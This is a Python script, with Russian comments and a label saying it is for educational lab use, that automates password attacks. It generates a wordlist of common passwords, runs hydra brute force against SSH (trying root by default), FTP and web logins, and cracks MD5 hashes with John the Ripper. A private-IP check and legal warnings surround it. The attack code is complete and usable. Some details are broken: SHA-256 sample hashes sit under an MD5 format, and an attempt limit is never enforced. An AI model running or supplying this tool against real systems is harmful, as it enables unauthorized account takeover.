#!/usr/bin/env python3
"""
Образовательный инструмент для атак с использованием John the Ripper
ВНИМАНИЕ: Только для использования в собственной лабораторной среде!

Автор: Образовательный материал для изучения кибербезопасности
Лицензия: Только для образовательных целей
"""

import subprocess
import sys
import os
import argparse
import time
import threading
from concurrent.futures import ThreadPoolExecutor

class JohnTheRipperAttacks:
    """
    Образовательный инструмент для демонстрации атак с John the Ripper
    """
    
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.common_passwords = [
            'password', '123456', 'admin', 'root', 'kali', 'toor',
            'password123', 'admin123', 'root123', 'kali123',
            'Password', 'Admin', 'Root', 'Kali',
            'P@ssw0rd', 'Adm1n', 'R00t', 'K@li',
            '12345678', 'qwerty', 'abc123', 'password1',
            'welcome', 'login', 'master', 'hello',
            'letmein', 'welcome123', 'monkey', 'dragon'
        ]
        self.common_usernames = [
            'root', 'admin', 'kali', 'user', 'test', 'guest',
            'administrator', 'ubuntu', 'debian', 'www-data',
            'apache', 'nginx', 'mysql', 'postgres', 'oracle'
        ]
        
        # Проверка безопасности
        if not self._is_safe_target(target_ip):
            print("❌ ОШИБКА: Атаки разрешены только для локальных сетей!")
            sys.exit(1)
    
    def _is_safe_target(self, ip):
        """Проверка безопасности цели"""
        safe_prefixes = ['127.', '192.168.', '10.']
        
        if ip.startswith('172.'):
            try:
                second_octet = int(ip.split('.')[1])
                return 16 <= second_octet <= 31
            except:
                return False
        
        return any(ip.startswith(prefix) for prefix in safe_prefixes)
    
    def check_john_installed(self):
        """
        Проверка установки John the Ripper
        """
        try:
            result = subprocess.run(['john', '--version'], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"✅ John the Ripper установлен: {result.stdout.strip()}")
                return True
            else:
                print("❌ John the Ripper не найден")
                return False
        except FileNotFoundError:
            print("❌ John the Ripper не установлен")
            print("💡 Установите: brew install john-jumbo")
            return False
        except Exception as e:
            print(f"❌ Ошибка проверки John: {e}")
            return False
    
    def generate_password_list(self, filename="passwords.txt"):
        """
        Генерация списка паролей для атаки
        """
        print(f"📝 Генерируем список паролей: {filename}")
        
        passwords = []
        
        # Добавляем общие пароли
        passwords.extend(self.common_passwords)
        
        # Добавляем пароли с цифрами
        for pwd in self.common_passwords[:10]:
            for i in range(10):
                passwords.append(f"{pwd}{i}")
                passwords.append(f"{i}{pwd}")
        
        # Добавляем пароли с символами
        symbols = ['!', '@', '#', '$', '%', '^', '&', '*']
        for pwd in self.common_passwords[:5]:
            for sym in symbols:
                passwords.append(f"{pwd}{sym}")
                passwords.append(f"{sym}{pwd}")
        
        # Удаляем дубликаты
        passwords = list(set(passwords))
        
        # Записываем в файл
        with open(filename, 'w') as f:
            for pwd in passwords:
                f.write(f"{pwd}\n")
        
        print(f"✅ Создан файл с {len(passwords)} паролями")
        return filename
    
    def ssh_brute_force(self, username=None, password_file=None, max_attempts=100):
        """
        SSH Brute Force атака с использованием hydra
        """
        print(f"🔐 SSH Brute Force атака на {self.target_ip}")
        
        if not username:
            username = 'root'  # По умолчанию пробуем root
        
        if not password_file:
            password_file = self.generate_password_list()
        
        print(f"👤 Пользователь: {username}")
        print(f"📁 Файл паролей: {password_file}")
        print(f"🔢 Максимум попыток: {max_attempts}")
        
        # Проверяем доступность SSH
        print("\n🔍 Проверяем доступность SSH...")
        try:
            result = subprocess.run(['nc', '-z', '-w', '3', self.target_ip, '22'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode != 0:
                print("❌ SSH недоступен на порту 22")
                return False
        except FileNotFoundError:
            print("⚠️  netcat не найден, пропускаем проверку порта")
        except Exception as e:
            print(f"⚠️  Ошибка проверки SSH: {e}")
        
        print("✅ SSH доступен, начинаем brute force...")
        
        # Используем hydra для SSH brute force
        try:
            cmd = [
                'hydra', '-l', username, '-P', password_file,
                '-t', '4', '-f', '-v', '1',
                f'ssh://{self.target_ip}'
            ]
            
            print(f"🚀 Выполняем: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                print("🎉 УСПЕХ! Найден пароль!")
                print(result.stdout)
                return True
            else:
                print("❌ Пароль не найден")
                print("📊 Статистика:")
                print(f"  • Попыток: {max_attempts}")
                print(f"  • Пользователь: {username}")
                print(f"  • Результат: Неудача")
                return False
                
        except subprocess.TimeoutExpired:
            print("⏱️  Timeout - атака прервана по времени")
            return False
        except FileNotFoundError:
            print("❌ Hydra не установлен")
            print("💡 Установите: brew install hydra")
            return False
        except Exception as e:
            print(f"❌ Ошибка SSH brute force: {e}")
            return False
    
    def ftp_brute_force(self, username=None, password_file=None):
        """
        FTP Brute Force атака
        """
        print(f"📁 FTP Brute Force атака на {self.target_ip}")
        
        if not username:
            username = 'anonymous'
        
        if not password_file:
            password_file = self.generate_password_list()
        
        print(f"👤 Пользователь: {username}")
        print(f"📁 Файл паролей: {password_file}")
        
        try:
            cmd = [
                'hydra', '-l', username, '-P', password_file,
                '-t', '4', '-f', '-v', '1',
                f'ftp://{self.target_ip}'
            ]
            
            print(f"🚀 Выполняем: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                print("🎉 УСПЕХ! Найден FTP пароль!")
                print(result.stdout)
                return True
            else:
                print("❌ FTP пароль не найден")
                return False
                
        except Exception as e:
            print(f"❌ Ошибка FTP brute force: {e}")
            return False
    
    def web_login_brute_force(self, url, username=None, password_file=None):
        """
        Web Login Brute Force атака
        """
        print(f"🌐 Web Login Brute Force атака на {url}")
        
        if not username:
            username = 'admin'
        
        if not password_file:
            password_file = self.generate_password_list()
        
        print(f"👤 Пользователь: {username}")
        print(f"📁 Файл паролей: {password_file}")
        
        try:
            cmd = [
                'hydra', '-l', username, '-P', password_file,
                '-t', '4', '-f', '-v', '1',
                url
            ]
            
            print(f"🚀 Выполняем: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                print("🎉 УСПЕХ! Найден web пароль!")
                print(result.stdout)
                return True
            else:
                print("❌ Web пароль не найден")
                return False
                
        except Exception as e:
            print(f"❌ Ошибка web brute force: {e}")
            return False
    
    def hash_cracking(self, hash_file, wordlist=None):
        """
        Взлом хешей с помощью John the Ripper
        """
        print(f"🔓 Взлом хешей из файла: {hash_file}")
        
        if not os.path.exists(hash_file):
            print(f"❌ Файл {hash_file} не найден")
            return False
        
        if not wordlist:
            wordlist = self.generate_password_list()
        
        print(f"📁 Словарь: {wordlist}")
        
        try:
            # Запускаем John the Ripper
            cmd = ['john', '--wordlist=' + wordlist, '--format=raw-md5', hash_file]
            
            print(f"🚀 Выполняем: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                print("🎉 УСПЕХ! Хеши взломаны!")
                
                # Показываем результаты
                show_cmd = ['john', '--show', '--format=raw-md5', hash_file]
                show_result = subprocess.run(show_cmd, capture_output=True, text=True)
                
                if show_result.returncode == 0:
                    print("📊 Найденные пароли:")
                    print(show_result.stdout)
                
                return True
            else:
                print("❌ Хеши не взломаны")
                return False
                
        except Exception as e:
            print(f"❌ Ошибка взлома хешей: {e}")
            return False
    
    def create_sample_hashes(self, filename="hashes.txt"):
        """
        Создание файла с примерными хешами для демонстрации
        """
        print(f"📝 Создаем файл с примерами хешей: {filename}")
        
        # Примеры MD5 хешей (в реальности нужно получать с целевой системы)
        sample_hashes = [
            "5d41402abc4b2a76b9719d911017c592:hello",  # hello
            "098f6bcd4621d373cade4e832627b4f6:test",   # test
            "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:hello",  # hello (SHA256)
            "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3:hello",  # hello (SHA256)
        ]
        
        with open(filename, 'w') as f:
            for hash_line in sample_hashes:
                f.write(f"{hash_line}\n")
        
        print(f"✅ Создан файл с {len(sample_hashes)} хешами")
        return filename

def main():
    """
    Главная функция John the Ripper атак
    """
    print("=" * 60)
    print("🔓 ОБРАЗОВАТЕЛЬНЫЕ АТАКИ С JOHN THE RIPPER")
    print("=" * 60)
    print("⚠️  ВНИМАНИЕ: Только для использования в собственной лаборатории!")
    print("⚠️  Использование против чужих систем НЕЗАКОННО!")
    print("=" * 60)
    
    parser = argparse.ArgumentParser(description='Образовательные атаки с John the Ripper')
    parser.add_argument('target', help='IP адрес цели')
    parser.add_argument('--ssh', action='store_true', help='SSH brute force')
    parser.add_argument('--ftp', action='store_true', help='FTP brute force')
    parser.add_argument('--web', help='Web login brute force (URL)')
    parser.add_argument('--hash', help='Взлом хешей (файл с хешами)')
    parser.add_argument('--create-hashes', action='store_true', help='Создать примеры хешей')
    parser.add_argument('-u', '--username', help='Имя пользователя')
    parser.add_argument('-w', '--wordlist', help='Файл со словарем паролей')
    
    args = parser.parse_args()
    
    # Создаем экземпляр инструмента
    john_tool = JohnTheRipperAttacks(args.target)
    
    # Проверяем установку John
    if not john_tool.check_john_installed():
        print("❌ John the Ripper не установлен. Установите его для продолжения.")
        return
    
    try:
        if args.create_hashes:
            john_tool.create_sample_hashes()
        
        elif args.ssh:
            john_tool.ssh_brute_force(args.username, args.wordlist)
        
        elif args.ftp:
            john_tool.ftp_brute_force(args.username, args.wordlist)
        
        elif args.web:
            john_tool.web_login_brute_force(args.web, args.username, args.wordlist)
        
        elif args.hash:
            john_tool.hash_cracking(args.hash, args.wordlist)
        
        else:
            print("❌ Выберите тип атаки: --ssh, --ftp, --web, --hash или --create-hashes")
            
    except KeyboardInterrupt:
        print("\n🛑 Атака прервана пользователем")
    except Exception as e:
        print(f"❌ Ошибка: {e}")
    
    print("\n📚 Образовательная информация:")
    print("• John the Ripper - инструмент для взлома паролей")
    print("• Brute Force - перебор паролей по словарю")
    print("• Hash Cracking - взлом хешей паролей")
    print("• Hydra - инструмент для сетевых brute force атак")
    print("\n🛡️  Методы защиты:")
    print("• Сильные пароли и политики паролей")
    print("• Двухфакторная аутентификация")
    print("• Ограничение попыток входа")
    print("• Мониторинг подозрительной активности")

if __name__ == "__main__":
    main()
